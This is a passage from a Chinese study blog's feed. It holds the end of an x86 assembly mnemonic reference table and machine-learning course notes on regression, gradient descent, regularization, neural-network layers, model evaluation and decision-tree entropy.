adjust on multiplication</td></tr><tr><td>DIV</td><td>divide</td></tr><tr><td>IDIV</td><td>integer divide</td></tr><tr><td>AAD</td><td>ascii adjust on divide</td></tr><tr><td>CBW</td><td>change byte to word</td></tr><tr><td>CWD</td><td>change word to double word</td></tr><tr><td>CWDE</td><td>change word to double word with sign to  EAX</td></tr><tr><td>CDQ</td><td>change double word to quadrate word</td></tr><tr><td></td><td></td></tr></tbody></table><h3 id="2-、逻辑运算指令"><a href="#2-、逻辑运算指令" class="headerlink" title="2 、逻辑运算指令"></a>2 、逻辑运算指令</h3><table><thead><tr><th>指令</th><th>英文全称</th></tr></thead><tbody><tr><td>AND</td><td>and</td></tr><tr><td>OR</td><td>or</td></tr><tr><td>XOR</td><td>xor</td></tr><tr><td>NOT</td><td>not</td></tr><tr><td>TEST</td><td>test</td></tr><tr><td>SHL</td><td>shift left</td></tr><tr><td>SAL</td><td>arithmatic shift left</td></tr><tr><td>SHR</td><td>shift right</td></tr><tr><td>SAR</td><td>arithmatic shift right</td></tr><tr><td>ROL</td><td>rotate left</td></tr><tr><td>ROR</td><td>rotate right</td></tr><tr><td>RCL</td><td>rotate left with carry</td></tr><tr><td>RCR</td><td>rotate right with carry</td></tr><tr><td></td><td></td></tr></tbody></table><h2 id="三、字符串操作指令"><a href="#三、字符串操作指令" class="headerlink" title="三、字符串操作指令"></a>三、字符串操作指令</h2><table><thead><tr><th>指令</th><th>英文全称</th></tr></thead><tbody><tr><td>MOVS</td><td>move string</td></tr><tr><td>CMPS</td><td>compare string</td></tr><tr><td>SCAS</td><td>scan string</td></tr><tr><td>LODS</td><td>load string</td></tr><tr><td>STOS</td><td>store string</td></tr><tr><td>REP</td><td>repeat</td></tr><tr><td>REPE</td><td>repeat when equal</td></tr><tr><td>REPZ</td><td>repeat when zero flag</td></tr><tr><td>REPNE</td><td>repeat when not equal</td></tr><tr><td>REPNZ</td><td>repeat when zero flag</td></tr><tr><td>REPC</td><td>repeat when carry flag</td></tr><tr><td>REPNC</td><td>repeat when not carry flag</td></tr><tr><td></td><td></td></tr></tbody></table><h2 id="四、程序转移指令"><a href="#四、程序转移指令" class="headerlink" title="四、程序转移指令"></a>四、程序转移指令</h2><h3 id="1-、-无条件转移指令-长转移"><a href="#1-、-无条件转移指令-长转移" class="headerlink" title="1 、 无条件转移指令 ( 长转移 )"></a>1 、 无条件转移指令 ( 长转移 )</h3><table><thead><tr><th>指令</th><th>英文全称</th></tr></thead><tbody><tr><td>JMP</td><td>jump</td></tr><tr><td>CALL</td><td>call</td></tr><tr><td>RET</td><td>return</td></tr><tr><td>RETF</td><td>return far</td></tr><tr><td></td><td></td></tr></tbody></table><h3 id="2-、-条件转移指令-短转移-128-到-127-的距离内"><a href="#2-、-条件转移指令-短转移-128-到-127-的距离内" class="headerlink" title="2 、 条件转移指令 ( 短转移 ,128 到 +127 的距离内 )"></a>2 、 条件转移指令 ( 短转移 ,128 到 +127 的距离内 )</h3><table><thead><tr><th>指令</th><th>英文全称</th></tr></thead><tbody><tr><td>JAE</td><td>jump when above or equal</td></tr><tr><td>JNB</td><td>jump when not below</td></tr><tr><td>JB</td><td>jump when below</td></tr><tr><td>JNAE</td><td>jump when not above or equal</td></tr><tr><td>JBE</td><td>jump when below or equal</td></tr><tr><td>JNA</td><td>jump when not above</td></tr><tr><td>JG</td><td>jump when greater</td></tr><tr><td>JNLE</td><td>jump when not less or equal</td></tr><tr><td>JGE</td><td>jump when greater or equal</td></tr><tr><td>JNL</td><td>jump when not less</td></tr><tr><td>JL</td><td>jump when less</td></tr><tr><td>JNGE</td><td>jump when not greater or equal</td></tr><tr><td>JLE</td><td>jump when less or equal</td></tr><tr><td>JNG</td><td>jump when not greater</td></tr><tr><td>JE</td><td>jump when equal</td></tr><tr><td>JZ</td><td>jump when has zero flag</td></tr><tr><td>JNE</td><td>jump when not equal</td></tr><tr><td>JNZ</td><td>jump when not has zero flag</td></tr><tr><td>JC</td><td>jump when has carry flag</td></tr><tr><td>JNC</td><td>jump when not has carry flag</td></tr><tr><td>JNO</td><td>jump when not has overflow flag</td></tr><tr><td>JNP</td><td>jump when not has parity flag</td></tr><tr><td>JPO</td><td>jump when parity flag is odd</td></tr><tr><td>JNS</td><td>jump when not has sign flag</td></tr><tr><td>JO</td><td>jump when has overflow flag</td></tr><tr><td>JP</td><td>jump when has parity flag</td></tr><tr><td>JPE</td><td>jump when parity flag is even</td></tr><tr><td>JS</td><td>jump when has sign flag</td></tr><tr><td></td><td></td></tr></tbody></table><h3 id="3-、-循环控制指令-短转移"><a href="#3-、-循环控制指令-短转移" class="headerlink" title="3 、 循环控制指令 ( 短转移 )"></a>3 、 循环控制指令 ( 短转移 )</h3><table><thead><tr><th>指令</th><th>英文全称</th></tr></thead><tbody><tr><td>LOOP</td><td>loop</td></tr><tr><td>LOOPE</td><td>loop equal</td></tr><tr><td>LOOPZ</td><td>loop zero</td></tr><tr><td>LOOPNE</td><td>loop not equal</td></tr><tr><td>LOOPNZ</td><td>loop not zero</td></tr><tr><td>JCXZ</td><td>jump when CX is zero</td></tr><tr><td>JECXZ</td><td>jump when ECX is zero</td></tr><tr><td></td><td></td></tr></tbody></table><h2 id="五-、中断指令"><a href="#五-、中断指令" class="headerlink" title="五 、中断指令"></a>五 、中断指令</h2><table><thead><tr><th>指令</th><th>英文全称</th></tr></thead><tbody><tr><td>INT</td><td>interrupt</td></tr><tr><td>INTO</td><td>overflow interrupt</td></tr><tr><td>IRET</td><td>interrupt return</td></tr><tr><td></td><td></td></tr></tbody></table><h2 id="六、-处理器控制指令"><a href="#六、-处理器控制指令" class="headerlink" title="六、 处理器控制指令"></a>六、 处理器控制指令</h2><table><thead><tr><th>指令</th><th>英文全称</th></tr></thead><tbody><tr><td>HLT</td><td>halt</td></tr><tr><td>WAIT</td><td>wait</td></tr><tr><td>ESC</td><td>escape</td></tr><tr><td>LOCK</td><td>lock</td></tr><tr><td>NOP</td><td>no operation</td></tr><tr><td>STC</td><td>set carry</td></tr><tr><td>CLC</td><td>clear carry</td></tr><tr><td>CMC</td><td>carry make change</td></tr><tr><td>STD</td><td>set direction</td></tr><tr><td>CLD</td><td>clear direction</td></tr><tr><td>STI</td><td>set interrupt</td></tr><tr><td>CLI</td><td>clear interrupt</td></tr><tr><td></td><td></td></tr></tbody></table><h2 id="七、-伪指令"><a href="#七、-伪指令" class="headerlink" title="七、 伪指令"></a>七、 伪指令</h2><table><thead><tr><th>指令</th><th>英文全称</th></tr></thead><tbody><tr><td>DW</td><td>define word</td></tr><tr><td>PROC</td><td>procedure</td></tr><tr><td>ENDP</td><td>end of procedure</td></tr><tr><td>SEGMENT</td><td>segment</td></tr><tr><td>ASSUME</td><td>assume</td></tr><tr><td>ENDS</td><td>end segment</td></tr><tr><td>END</td><td>end</td></tr><tr><td></td><td></td></tr></tbody></table><p><img src="C:\Users\86183\AppData\Roaming\Typora\typora-user-images\image-20220626085110131.png" alt="image-20220626085110131"></p>]]></content>
      
      
      <categories>
          
          <category> Note-re </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>机器学习笔记</title>
      <link href="/2023/01/04/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/01/04/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h1><p>​    小小的俗称一波deeplearning，仅以此文作为笔记，参考课程：</p><p><a href="https://www.bilibili.com/video/BV1Pa411X76s?p=66&amp;vd_source=b5a5a804f02900e9715541fac229a727">https://www.bilibili.com/video/BV1Pa411X76s?p=66&amp;vd_source=b5a5a804f02900e9715541fac229a727</a></p><p>​    本文暂不记录任何代码实现，仅记录我对于机器学习过程的直观理解。</p><h2 id="0x01-第一课-机器学习入门"><a href="#0x01-第一课-机器学习入门" class="headerlink" title="0x01 第一课 机器学习入门"></a>0x01 第一课 机器学习入门</h2><p>机器学习分为有监督和无监督学习</p><ul><li>有监督学习是输入时就有结果的学习过程</li><li>无监督是输入一大堆，让机器自行分类的过程</li></ul><h3 id="一、线性回归"><a href="#一、线性回归" class="headerlink" title="一、线性回归"></a>一、线性回归</h3><p>​    输入一大堆数据，通过线性拟合将其趋向整合为一个方程。</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221005140257384.png" alt="image-20221005140257384" style="zoom: 25%;" /><p>​    输入由x1,x2…xn,y组成的数据集，通过随机初始化w1,w2….wn，使得这一拟合出的直线与样本集的差距尽量小，其差距由<strong>代价函数</strong>（cost function）量化，如上所示。我们的目标就是不断调整w和b的取值，使得代价函数最小。</p><p>​    注：上图中m为样本数量。</p><p>​    这里提到两个概念，<strong>代价函数</strong>和<strong>损失函数</strong>，其中代价函数用 J(w,b) 表示，用于表示整个样本集和当前拟合出曲线的差距。而损失函数 ，用<img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221005163525544.png" alt="image-20221005163525544" style="zoom:50%;" />表示，用于代表一个样本所造成的偏差值大小。其中代价函数被定义为所有样本点损失函数的平均值再除以2。</p><h4 id="1、梯度下降"><a href="#1、梯度下降" class="headerlink" title="1、梯度下降"></a>1、梯度下降</h4><p>​    要达成上述目地，我们需要逐步调整w和b的值，同过如下的方式：</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221005141055552.png" alt="image-20221005141055552" style="zoom:33%;" /><p>​    其中，等式右侧的的右侧的 值实际就是对代价函数求导，来判断在这一点上w、b的梯度值，直观来说，就是在这一点的下降趋势是否陡峭。若陡峭（且为正），则w就会随着上面的方程式快速减少），可以用如下的图示进行直观理解：</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221005141917777.png" alt="image-20221005141917777" style="zoom: 33%;" /><p>​    假设函数只有一个w（因为三维比较好理解），代价函数为纵轴，梯度下降所做的就是找到一条更快速下山的路线，若比较陡峭，就一步多走一点，若比较平缓，则少走一点。总之就是判断斜率然后判断以多大的速度往哪边走，但是要衡量走路的速度值，我们需要有一个基准数，也就是上式中的学习率a。</p><h4 id="2、学习率"><a href="#2、学习率" class="headerlink" title="2、学习率"></a>2、学习率</h4><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221005142315981.png" alt="image-20221005142315981" style="zoom:50%;" /><p>​    如图所示，a若选择的太小，如上图右上所示，梯度下降的进行过程就太慢。反之如果a选择的过大，可能导致梯度下降永远无法进行到最小值点。</p><h4 id="3、线性回归的梯度下降"><a href="#3、线性回归的梯度下降" class="headerlink" title="3、线性回归的梯度下降"></a>3、线性回归的梯度下降</h4><p>​    在线性回归下，即我们使用线性回归的代价函数，我们可以将其代价函数与梯度下降算法合并，得到以下算式：</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221005142749701.png" alt="image-20221005142749701" style="zoom: 50%;" /><p>​    只要反复对初始化过的w和b执行如上操作，待w和b的值趋于不变时，我们就求出了完美的w和b。然后带入原算式 y=wx+b，就可以根据输入的x算出任意y的值。</p><p>​    要判断梯度下降是否收敛，可以观察 训练次数-损失函数 曲线，如下所示。</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221005151347643.png" alt="image-20221005151347643" style="zoom:50%;" /><p>​    通过梯度下降是否收敛，可以反映出学习率的选用是否合适，一般来说，学习率以三倍为一缩放，十倍为两缩放。即0.1、0.3、1.0、3.0、10、30、100这样的速率进行调整。</p><p>​    </p><h4 id="4、向量化"><a href="#4、向量化" class="headerlink" title="4、向量化"></a>4、向量化</h4><p>​    实际情况下，不可能w（属特征值）只有一个，肯定y是有一大堆wx组成的，因此可用向量化表示如下：</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221005143838514.png" alt="image-20221005143838514" style="zoom:33%;" /><p>​    向量化的好处就是，我们可以直接使用点乘这一运算计算大量数据的乘法，最终，其梯度下降算法如下所示：</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221005150436693.png" alt="image-20221005150436693" style="zoom: 67%;" /><p>​    </p><h3 id="二、特征缩放"><a href="#二、特征缩放" class="headerlink" title="二、特征缩放"></a>二、特征缩放</h3><h4 id="1、为什么要进行特征缩放？"><a href="#1、为什么要进行特征缩放？" class="headerlink" title="1、为什么要进行特征缩放？"></a>1、为什么要进行特征缩放？</h4><p>​    在线性回归问题中，假设由两个特征，这两个特征的基础值相差较大，如一个在0-1范围内，另一个在10-1M范围内，若我们画出其取值分布图，其将如下图左上所示，当我们如右上画出其代价函数等高线时，其将会是非常瘦长的，因为相对来讲，左图x2对其影响很大，而x1对其影响很小。</p><p>​    假如假设x1和x2对最终的y值起到几乎同等作用的印象，那么x1&gt;&gt;x2就会导致w1&lt;&lt;w2的结果，又因为二者共享同一个学习率，因此在进行梯度下降时，梯度曲线极有可能在对w1进行缩放时左右横跳，同时若将a设置的太小，又会对w2影响太小导致训练缓慢。因此我们需要对x1、x2进行缩放。</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221005145203685.png" alt="image-20221005145203685" style="zoom:67%;" /><h4 id="2、如何进行特征缩放？"><a href="#2、如何进行特征缩放？" class="headerlink" title="2、如何进行特征缩放？"></a>2、如何进行特征缩放？</h4><p><strong>基于最大值进行特征缩放</strong></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221005150304599.png" alt="image-20221005150304599"></p><p><strong>基于平均值进行特征缩放（均值归一化）</strong></p><p>​    其中μ为x的平均值。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221005150400195.png" alt="image-20221005150400195"></p><p><strong>基于正态分布进行特征缩放</strong></p><p>​    其中μ为x平均值，σ为标准差。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221005150936298.png" alt="image-20221005150936298"></p><h3 id="三、逻辑回归"><a href="#三、逻辑回归" class="headerlink" title="三、逻辑回归"></a>三、逻辑回归</h3><p>​    逻辑回归用于根据给定的特征，将对样本进行二分类。</p><h4 id="1、线性回归不再合适的原因"><a href="#1、线性回归不再合适的原因" class="headerlink" title="1、线性回归不再合适的原因"></a>1、线性回归不再合适的原因</h4><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221005155546032.png" alt="image-20221005155546032"></p><p>​    由于可能会有特别离谱的样本值，可能会把拟合出的线拉飞。</p><h4 id="2、逻辑回归详解"><a href="#2、逻辑回归详解" class="headerlink" title="2、逻辑回归详解"></a>2、逻辑回归详解</h4><p>​    逻辑回归沿用但不完全沿用线性回归：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221005160925737.png" alt="image-20221005160925737"></p><p>​    </p><p>​    <strong>损失函数</strong>如下：</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221005162603096.png" alt="image-20221005162603096" style="zoom:80%;" /><p>​    上式和下式是同一个意思，从主观上理解，当y等于1时，求出的值越远离1，也就是越靠近零，说明误差越大；反之越靠近1则误差越小，因此，上述两曲线应分别如下图所示。</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221005162258969.png" alt="image-20221005162258969" style="zoom: 67%;" /><p>​    通过以上损失函数，可累加轻易知代价函数如下：</p><img src="C:\Users\86183\AppData\Roaming\Typora\typora-user-images\image-20221005163142591.png" alt="image-20221005163142591" style="zoom:67%;" /><p>通过次代价函数，可进一步推出其梯度下降公式如下(分别求偏导数乘以学习率)：</p><img src="C:\Users\86183\AppData\Roaming\Typora\typora-user-images\image-20221005164152850.png" alt="image-20221005164152850.png" style="zoom:67%;" /><h4 id="3、过拟合（高方差）"><a href="#3、过拟合（高方差）" class="headerlink" title="3、过拟合（高方差）"></a>3、过拟合（高方差）</h4><p>​    当一条曲线和数据集的契合程度高，我们成为其拟合程度好。比如如下第二条条曲线，由于我们对x进行了多项式操作，使得其拟合程度相较单纯的线性回归，也就是第一条曲线，拟合度变得更高了。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221005164615845.png" alt="image-20221005164615845"></p><p>​    然而在第三条曲线中，我们添加了过多的多项式，使得曲线完全符合样本点，导致了过拟合现象。在过拟合现象发生后，一旦样本有轻微变化，样本曲线就会发生巨大的改变，且其预测效果也不好。如下，逻辑回归中也可能会出现过拟合现象：</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221005164847957.png" alt="image-20221005164847957" style="zoom: 50%;" /><p>​    解决过拟合有三种方式：</p><ul><li>增加样本量</li><li>在样本量较少的情况下，精简单个样本的特征数量</li><li>正则化</li></ul><p>其中方式一有点在于简单好用，但是我们可能没有更多样本；方式二可以解决问题，但是会损失我们掌握的信息；方式三是方式二的更好版本，也是一种较为科学的解决方案；</p><p><strong>正则化详解</strong></p><p>​    正则化的核心思想是缩小特征的系数，也就是缩小w的值（尤其是高维度特征的w）。</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221005165636629.png" alt="image-20221005165636629" style="zoom:50%;" /><p>​    如对于上式而言，我们应尽量使得w3、w4趋近于0，也就是尽量小。因此，我们将引入一种对于参数的惩罚机制，这一惩罚机制通过修改代价函数达成。</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221005165842909.png" alt="image-20221005165842909" style="zoom:67%;" /><p>​    源本代价函数仅仅是损失函数的平均值除以2，在进行正则化时，代价函数如上所示。若出现极大的w，会使得代价函数随之变大，这就会使得w在每一轮的迭代中尽量变小。其中λ制定了正则化的速度。</p><p>​    进一步的，我们对于代价函数的修改就会体现在梯度下降的过程中，如线性回归的梯度下降会变成如下形式，逻辑回归也是类似的：</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221005170310543.png" alt="image-20221005170310543" style="zoom:67%;" /><p>逻辑回归的正则化：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221005170440729.png" alt="image-20221005170440729"></p><h2 id="0x02-第二课-机器学习拓展"><a href="#0x02-第二课-机器学习拓展" class="headerlink" title="0x02 第二课 机器学习拓展"></a>0x02 第二课 机器学习拓展</h2><h3 id="一、神经网络的使用"><a href="#一、神经网络的使用" class="headerlink" title="一、神经网络的使用"></a>一、神经网络的使用</h3><p>​    无论是线性回归、多项式回归还是逻辑回归，当模型训练好后，都是输入-&gt;计算-&gt;输出的模型，然而在真正解决问题时，人类的神经元往往是多层的，同时线性会非线性的混用也可以增加思考的层次，因此，我们要将多个回归模型串起来。</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221006150732648.png" alt="image-20221006150732648" style="zoom:67%;" /><p>​    如上图所示，这是一个三层的神经网络，第一层有二十五个单元，第二层有十五个单元，第三层有一个单元。我们要定义整个网络中的某个回归模型，如第一层第2个模型的w，使用<img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221006151102459.png" alt="image-20221006151102459" style="zoom: 67%;" />来进行表示。每个单元均对应多个输入和一个输出。</p><p>​    不考虑w、b参数的训练过程，假设我们已经训练好了，要使用此网络，在每一层代码所做的事应该如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_dense</span>(<span class="params">a_in, W, b, g</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Computes dense layer</span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">      a_in (ndarray (n, )) : Data, 1 example 输入的数据</span></span><br><span class="line"><span class="string">      W    (ndarray (n,j)) : Weight matrix, n features per unit, j units</span></span><br><span class="line"><span class="string">      b    (ndarray (j, )) : bias vector, j units  </span></span><br><span class="line"><span class="string">      g    activation function (e.g. sigmoid, relu..) 激活函数</span></span><br><span class="line"><span class="string">    Returns</span></span><br><span class="line"><span class="string">      a_out (ndarray (j,))  : j units| 输出的数据</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    units = W.shape[<span class="number">1</span>]</span><br><span class="line">    a_out = np.zeros(units) <span class="comment">#输出向量长度为单元数</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(units):               </span><br><span class="line">        <span class="comment">#对每一个单元的内容进行计算</span></span><br><span class="line">        w = W[:,j]                                    </span><br><span class="line">        z = np.dot(w, a_in) + b[j]         </span><br><span class="line">        a_out[j] = g(z)               </span><br><span class="line">    <span class="keyword">return</span>(a_out)</span><br></pre></td></tr></table></figure><p>​    我们可以使用矩阵操作将其简化：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dense</span>(<span class="params">A_in,W,B</span>):</span></span><br><span class="line">    Z = np.matmul(A_in,W)+B</span><br><span class="line">    A_out = g(Z) <span class="comment">#激活函数</span></span><br><span class="line">    <span class="keyword">return</span> A_out</span><br></pre></td></tr></table></figure><p>​    对于激活函数的选取：</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221006152954198.png" alt="image-20221006152954198" style="zoom:80%;" /><p>​    二元分类取第一个也就是 1/(e^z+1) ；评估升降取第二个；预测价格取第三个。</p><p>​    选择激活函数的核心就是引入非线性，因为如果一个神经网络内部全都是使用的线性回归模型，那其本质就是一个线性回归模型，可用多项式展开来证明这一说法。</p><h3 id="二、Softmax"><a href="#二、Softmax" class="headerlink" title="二、Softmax"></a>二、Softmax</h3><h4 id="1、模型介绍"><a href="#1、模型介绍" class="headerlink" title="1、模型介绍"></a>1、模型介绍</h4><p>​    上述内容中，我们使用了逻辑回归解决二分类问题，但是未解决多元分类问题。沿用逻辑回归的思路和算算式，我们可以将其拓展为多元分类问题的解决思路。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221006223133101.png" alt="image-20221006223133101"></p><p>​    先用sigmoid方式依次求出值，然后取比例大小即可，没有什么新意。损失函数如下所示：</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221006223257070.png" alt="image-20221006223257070" style="zoom: 50%;" /><h4 id="2、优化方式"><a href="#2、优化方式" class="headerlink" title="2、优化方式"></a>2、优化方式</h4><ul><li>将多步运算合为一步防止中间步带了的误差</li><li>通过Adam方式加快梯度下降的进度</li><li>卷积网络，卷积层的每一个单元不使用上一层的所有输入，只用一部分</li></ul><h4 id="3、迁移学习"><a href="#3、迁移学习" class="headerlink" title="3、迁移学习"></a>3、迁移学习</h4><p>​    如图像处理等工作，如果样本量较少或者项目周期较短，可以通过使用其他项目的神经网络进行迁移学习：</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221008145753782.png" alt="image-20221008145753782" style="zoom:50%;" /><ul><li>方式一：重新训练输出层。</li><li>方式二：以迁移模型为初始值，重新训练所有参数。</li></ul><h3 id="三、模型评估"><a href="#三、模型评估" class="headerlink" title="三、模型评估"></a>三、模型评估</h3><h4 id="1、模型的形成、选择与评估"><a href="#1、模型的形成、选择与评估" class="headerlink" title="1、模型的形成、选择与评估"></a>1、模型的形成、选择与评估</h4><p>​    当我们需要在多个模型中选择一个最佳模型，并对其进行评判时，一般我们会将数据集拆分为两份，即train data和test data。二者分别用于训练和测试，最终使用test model的测试结果，如代价函数来评判一个模型的优劣性，然而这是不正确的。</p><p>​    由于test data在多个model中选出的结果最佳的一个，如下例：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221008142554447.png" alt="image-20221008142554447"></p><p>​    虽然w、b参数都是有train data决定的，但参数d是由test data决定的，因此我们不能使用test data作为模型评估的最终结果。    </p><p>​    一般来说，工作者会以6:2:2的方式分割元数据集，并将其分为三份：</p><ul><li>training set （训练集）用于训练的过程</li><li>cross validation （交叉验证集） 用于选出最佳的模型</li><li>test set （测试集合） 用于最终进行性能测试</li></ul><p>​    以线性回归为例，三者均使用如下公式进行计算：</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221008143038333.png" alt="image-20221008143038333" style="zoom:80%;" /><h4 id="2、方差与偏差"><a href="#2、方差与偏差" class="headerlink" title="2、方差与偏差"></a>2、方差与偏差</h4><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221008143726509.png" alt="image-20221008143726509" style="zoom:67%;" /><p>​    如上图，图左为欠拟合（高偏差）的实例，表现为训练集的损失大、交叉验证集的损失也大；图右为过拟合（高方差）的实例，表现为训练集的损失小，交叉验证集的损失大。由此，我们可以得知如下图所示，随着多项式指数的增加，训练集和交叉验证集的损失函数如下所示：</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221008143935570.png" alt="image-20221008143935570" style="zoom: 50%;" /><p>​    正则化参数对方差偏差的影响如下：</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221008144436935.png" alt="image-20221008144436935" style="zoom:50%;" /><p>​    关于调整参数，能为模型带来什么：</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221008145018050.png" alt="image-20221008145018050" style="zoom:67%;" /><ul><li>获取更多训练集 -&gt; 降低偏差</li><li>减少特征数量 -&gt; 降低偏差</li><li>添加特征或添加多项式系数 -&gt; 降低方差</li><li>升高正则化参数 -&gt; 降低偏差</li><li>降低正则化参数 -&gt; 降低方差</li></ul><h4 id="3、精确率和召回率"><a href="#3、精确率和召回率" class="headerlink" title="3、精确率和召回率"></a>3、精确率和召回率</h4><p>​    精确率和召回率的存在是起源于如下问题：</p><p>​    <em>若有一个样本集，其中99%为1，只有1%为0。对应的，一个机器学习程序的内容实际是print(“1”)，则这个模型就能够达到99%的准确度。</em>这样的衡量指标显然是不科学的，而为了解决这一问题，在逻辑回归中，我们不仅仅使用简单的对或错来评判预测结果，而是使用如下方式：</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221008155229891.png" alt="image-20221008155229891" style="zoom:67%;" /><p>​    如上图所示：精度（Precision）指向在所有评估为1的结果中正确的比例；而召回率表示在所有为1的结果中，有多少内容被预测出。主观上讲，精确率表示预测的结果的准确程度（即预测的是否对），而召回率表示预测范围的准确程度（即预测的是否全）。</p><p>​    有了如上两个判定方式之后，我们就需要对结果进行评判，我们所希望的是精度和召回率都保持在一定的高度，否则程序就有可能是类似于pirnt(“1”)或print(“0”)的废物程序，因此，可通过如下算式将两个值拟合：</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221008160648340.png" alt="image-20221008160648340" style="zoom:67%;" /><p>平均值显然是不科学的，通过右下式子的拟合可以保证拟合结果受较小的值较大影响。</p><p>​    </p><h3 id="四、决策树"><a href="#四、决策树" class="headerlink" title="四、决策树"></a>四、决策树</h3><p>​    要实现二分类文体，也可通过决策树：</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221018214431300.png" alt="image-20221018214431300" style="zoom:50%;" /><p>​        如图所示，每个特征对应一个非叶节点，而叶节点对应决策树的判别结果。输入一个待判断节点时，依次从决策树由上向下归类即可。</p><h4 id="1、-决策树基本搭建思路"><a href="#1、-决策树基本搭建思路" class="headerlink" title="1、 决策树基本搭建思路"></a>1、 决策树基本搭建思路</h4><p><strong>问题一：如何选择在哪一个节点使用哪一个特征进行分类？</strong></p><p>​    和信息像是，决策树在每个节点尽量减少熵，即增大纯度（也就是尽量分的更加正确，尽量一边全是猫、一边全是狗）。</p><p>​    那么下面给出如何衡量纯度：</p><p>首先我们需要学会如何计算熵：</p><p>​    熵是衡量纯度的唯一标准，若一组数据熵比较大，则说明纯度小；反之熵小则说明纯度大。而熵是可以和比例相互对应的，比例越接近1：1，则说明熵越大。如下图，横轴为比例，纵轴为熵：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221018220347047.png" alt="image-20221018220347047"></p><p>​    下面是计算熵的公式：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221018220447362.png" alt="image-20221018220447362"></p><p>​    综上，只要给出任意一个节点的样本数据，我们就可以给出他的熵。</p><p>然后，学会计算一组样本的熵后，可如下计算纯度的增益（信息增益）：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221018220732428.png" alt="image-20221018220732428"></p><p>上式可以表示为：</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20221018220926245.png" alt="image-20221018220926245" style="zoom:33%;" 